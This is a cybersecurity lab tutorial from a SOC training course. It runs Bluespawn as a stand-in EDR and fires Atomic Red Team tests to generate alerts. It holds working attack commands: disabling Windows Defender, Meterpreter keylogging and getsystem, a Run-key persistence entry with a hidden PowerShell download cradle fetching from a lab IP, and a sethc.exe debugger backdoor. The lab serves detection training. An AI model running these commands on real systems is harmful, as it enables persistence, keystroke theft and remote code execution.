---
tags:
  - bluespawn
  - edr
  - lab-soc-core-skills
date: Feb 09, 2024
---

## Bluespawn

> _Disclaimer: The content, procedures, and materials provided in this lab are strictly for educational purposes. Any information acquired is intended solely for advancing knowledge in cybersecurity. All procedures outlined in this lab, along with the VM utilized, were developed and acquired from the [SOC Core Skills](https://www.antisyphontraining.com/on-demand-courses/soc-core-skills-w-john-strand/) course instructed by [John Strand](https://www.sans.org/profiles/john-strand/). It is emphasized that the knowledge gained here will not be applied for any unauthorized or malicious activities._

> In this lab, we're leveraging Bluespawn as a cost-effective alternative to full-fledged EDR systems like Cylance and Crowdstrike, which are typically expensive and not commonly accessible in educational settings. Developed by the University of Virginia, Bluespawn serves as a stand-in for an EDR system, effectively monitoring the system for anomalous behavior and flagging it for review. Despite its affordability, Bluespawn proves to be a valuable tool, particularly for educational purposes. Throughout the lab, we'll initiate Bluespawn and execute Atomic Red Team tests to deliberately trigger a variety of alerts, providing hands-on experience in identifying and responding to suspicious activity. This practical exercise equips participants with essential skills in threat detection and incident response within a simulated environment.

---

First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:

`Set-MpPreference -DisableRealtimeMonitoring $true`

This will disable Defender for this session.

If you get angry red errors, that is Ok, it means Defender is not running.

![](_attachments/Pasted%20image%2020240211033009.png)

Let's get started by opening a Terminal as Administrator:

![](_attachments/Pasted%20image%2020240211033031.png)

Now, let's open a command Prompt:

![](_attachments/Pasted%20image%2020240211033057.png)

Next, let’s change directories to tools and start Bluespawn:
C:\Users\adhd>`cd \tools`

C:\tools>`BLUESPAWN-client-x64.exe --monitor --level Cursory`

![](_attachments/Pasted%20image%2020240211033116.png)

Now, let’s use Atomic Red Team to test the monitoring with BlueSpawn:

First, we need to open a PowerShell Prompt:

Next, in the PowerShell Window we need to navigate to the Atomic Red Team directory and import the powershell modules:

PS C:\Users\adhd> `cd C:\AtomicRedTeam\invoke-atomicredteam\`

Then, install the proper yaml modules

PS C:\Users\adhd> `Install-Module -Name powershell-yaml`

PS C:\AtomicRedTeam\invoke-atomicredteam> `Import-Module .\Invoke-AtomicRedTeam.psm1`

![](_attachments/Pasted%20image%2020240211033136.png)

Now, we need to invoke all the Atomic Tests.

Special note...  Don't do this in production...  Ever.  Always run tools like Atomic Red Team on test systems.  We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode.  This is so you can see what the protection would have done, but it will allow the tests to finish.

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest All`

If you get any “file exists” questions or errors, just select Yes.

![](_attachments/Pasted%20image%2020240211033150.png)

It should look like this:

![](_attachments/Pasted%20image%2020240211033206.png)

Please note, there will be some errors when this runs.  This is normal.


Only let this run for about 120 seconds!!!  Kill it with Ctrl + c!!

You should be getting a lot of alerts with Bluespawn Switch tabs in your Terminal to see them:

![](_attachments/Pasted%20image%2020240211033223.png)


Now, let’s go back to the PowerShell prompt and clean up:

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest All -Cleanup`

It should look like this:

![](_attachments/Pasted%20image%2020240211033242.png)

### If you have more time

Feel free to exploit system using the commands we went through in AppLocker or Sysmon and then run the following Meterpreter commands


Run commands

meterpreter > `keyscan_start`

meterpreter > `keyscan_dump`

![](_attachments/Pasted%20image%2020240211033300.png)


meterpreter > `shell`

C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`

C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`

![](_attachments/Pasted%20image%2020240211033319.png)



meterpreter >`getsystem`

![](_attachments/Pasted%20image%2020240211033338.png)

![](_attachments/Pasted%20image%2020240211033358.png)
